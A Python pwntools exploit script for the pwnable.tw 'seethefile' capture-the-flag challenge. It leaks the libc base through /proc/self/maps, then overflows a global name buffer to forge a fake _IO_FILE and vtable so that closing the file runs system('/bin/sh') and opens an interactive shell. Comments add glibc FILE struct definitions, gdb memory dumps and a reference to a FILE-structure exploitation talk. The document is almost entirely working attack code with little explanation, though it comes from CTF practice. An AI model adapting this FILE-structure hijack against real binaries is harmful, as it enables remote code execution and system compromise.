from pwn import *

s = remote("chall.pwnable.tw", 10200)
_ = s.recvuntil("Your choice :")

def open(file):
	s.sendline(str(1))
	_ = s.recvuntil("want to see :")
	s.sendline(file)
	_ = s.recvuntil("Your choice :")
def read():
	s.sendline(str(2))
	_ = s.recvuntil("Your choice :")
def write():
	s.sendline(str(3))
	return s.recvuntil("Your choice :")
def close():
	s.sendline(str(4))
	_ = s.recvuntil("Your choice :")
def exit(name):
	s.sendline(str(5))
	_ = s.recvuntil("Leave your name :")
	s.sendline(name)
	_ = s.recv()			

if __name__ == "__main__":
	libc = ELF("libc_32.so.6")
	sys_off = libc.symbols['system']

	open("/proc/self/maps")
	read()
	# result = fread(magicbuf, 0x18Fu, 1u, fp);
	'''
	08048000-0804a000 r-xp 00000000 08:00 249799                             /home/seethefile/seethefile
	0804a000-0804b000 r--p 00001000 08:00 249799                             /home/seethefile/seethefile
	0804b000-0804c000 rw-p 00002000 08:00 249799                             /home/seethefile/seethefile
	08b78000-08b9a000 rw-p 00000000 00:00 0                                  [heap]
	f7530000-f7531000 rw-p 00000000 00:00 0
	f7531000-f76de000 r-xp 00000000 08:00 1269223                            /lib32/libc-2.23.so
	f76de000-f76df000 ---p 001ad000 08:00 1269223                            /lib32/libc-2.23.so
	f76df000-f76e1000 r--p 001ad000 08:00 1269223                            /lib32/libc-2.23.so
	f76e1000-f76e2000 rw-p 001af000 08:00 1269223                            /lib32/libc-2.23.so
	f76e2000-f76e6000 rw-p 00000000 00:00 0 
	f76eb000-f76ed000 r--p 00000000 00:00 0                                  [vvar]
	f76ed000-f76ef000 r-xp 00000000 00:00 0                                  [vdso]
	f76ef000-f7711000 r-xp 00000000 08:00 1269216                            /lib32/ld-2.23.so
	f7711000-f7712000 rw-p 00000000 00:00 0 
	f7712000-f7713000 r--p 00022000 08:00 1269216                            /lib32/ld-2.23.so
	f7713000-f7714000 rw-p 00023000 08:00 1269216                            /lib32/ld-2.23.so
	ffe10000-ffe31000 rw-p 00000000 00:00 0                                  [stack]
	'''
	read()
	ret = write()
	ret = "0x" + ret[25:33]
	libc_base = int(ret, 16)
	sys_addr = libc_base + sys_off
	close()
	'''
	0x0804b260: name[0x20]
	0x0804b280: fp
	'''
	payload  = "/bin/sh\x00" + p32(0)*6 + p32(0x0804b260) + p32(0)*9 + p32(0x0804b270)
	payload += p32(0)*17 + p32(sys_addr) + p32(0x804b2ac) + p32(0)*2
	exit(payload)

	s.interactive()

'''
struct _IO_FILE {  
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */  
#define _IO_file_flags _flags  
  /* The following pointers correspond to the C++ streambuf protocol. */  
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  
  char* _IO_read_ptr;   /* Current read pointer */  
  char* _IO_read_end;   /* End of get area. */  
  char* _IO_read_base;  /* Start of putback+get area. */  
  char* _IO_write_base; /* Start of put area. */  
  char* _IO_write_ptr;  /* Current put pointer. */  
  char* _IO_write_end;  /* End of put area. */  
  char* _IO_buf_base;   /* Start of reserve area. */  
  char* _IO_buf_end;    /* End of reserve area. */  
  /* The following fields are used to support backing up and undo. */  
  char *_IO_save_base; /* Pointer to start of non-current get area. */  
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  
  char *_IO_save_end; /* Pointer to end of non-current get area. */  
  struct _IO_marker *_markers;  
  struct _IO_FILE *_chain;  
  int _fileno;  
#if 0  
  int _blksize;  
#else  
  int _flags2;  
#endif  
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */  
#define __HAVE_COLUMN /* temporary */  
  /* 1+column number of pbase(); 0 is unknown. */  
  unsigned short _cur_column;  
  signed char _vtable_offset;  
  char _shortbuf[1];  
  /*  char* _save_gptr;  char* _save_egptr; */  
  _IO_lock_t *_lock;  
#ifdef _IO_USE_OLD_IO_FILE  
};  
struct _IO_FILE_plus  
{  
  _IO_FILE file;  
  const struct _IO_jump_t *vtable;
};  
'''
'''
const struct _IO_jump_t _IO_file_jumps =  
{  
  JUMP_INIT_DUMMY,  
  JUMP_INIT(finish, INTUSE(_IO_file_finish)),  
  JUMP_INIT(overflow, INTUSE(_IO_file_overflow)),  
  JUMP_INIT(underflow, INTUSE(_IO_file_underflow)),  
  JUMP_INIT(uflow, INTUSE(_IO_default_uflow)),  
  JUMP_INIT(pbackfail, INTUSE(_IO_default_pbackfail)),  
  JUMP_INIT(xsputn, INTUSE(_IO_file_xsputn)),
  JUMP_INIT(xsgetn, INTUSE(_IO_file_xsgetn)),  
  JUMP_INIT(seekoff, _IO_new_file_seekoff),  
  JUMP_INIT(seekpos, _IO_default_seekpos),  
  JUMP_INIT(setbuf, _IO_new_file_setbuf), 
  JUMP_INIT(sync, _IO_new_file_sync),  
  JUMP_INIT(doallocate, INTUSE(_IO_file_doallocate)),  
  JUMP_INIT(read, INTUSE(_IO_file_read)),  
  JUMP_INIT(write, _IO_new_file_write),  
  JUMP_INIT(seek, INTUSE(_IO_file_seek)),  
  JUMP_INIT(close, INTUSE(_IO_file_close)),  
  JUMP_INIT(stat, INTUSE(_IO_file_stat)),  
  JUMP_INIT(showmanyc, _IO_default_showmanyc),  
  JUMP_INIT(imbue, _IO_default_imbue)  
};  
'''
'''
gdb-peda$ x /41x stderr
0xf7797cc0: 0xfbad2086  0x00000000  0x00000000  0x00000000
0xf7797cd0: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7797ce0: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7797cf0: 0x00000000  0xf7797d60  0x00000002  0x00000000
0xf7797d00: 0xffffffff  0x00000000  0xf7798864  0xffffffff
0xf7797d10: 0xffffffff  0x00000000  0xf7797420  0x00000000
0xf7797d20: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7797d30: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7797d40: 0x00000000  0x00000000  0x00000000  0x00000000
0xf7797d50: 0x00000000  0xf7796ac0  0x00000000  0x00000000
0xf7797d60: 0xfbad2887
gdb-peda$ x /21x 0xf7fceac0
0xf7fceac0 <_IO_file_jumps>:    0x00000000  0x00000000  0xf7e87d80<_IO_file_finish> 0xf7e88760
0xf7fcead0 <_IO_file_jumps+16>: 0xf7e88500  0xf7e895d0  0xf7e8a460  0xf7e879f0
0xf7fceae0 <_IO_file_jumps+32>: 0xf7e87610  0xf7e868b0  0xf7e89870  0xf7e866f0
0xf7fceaf0 <_IO_file_jumps+48>: 0xf7e865e0  0xf7e7bdb0  0xf7e879a0  0xf7e87460
0xf7fceb00 <_IO_file_jumps+64>: 0xf7e871a0  0xf7e866c0<_IO_file_close>  0xf7e87440  0xf7e8a5f0
0xf7fceb10 <_IO_file_jumps+80>: 0xf7e8a600
'''
# https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique
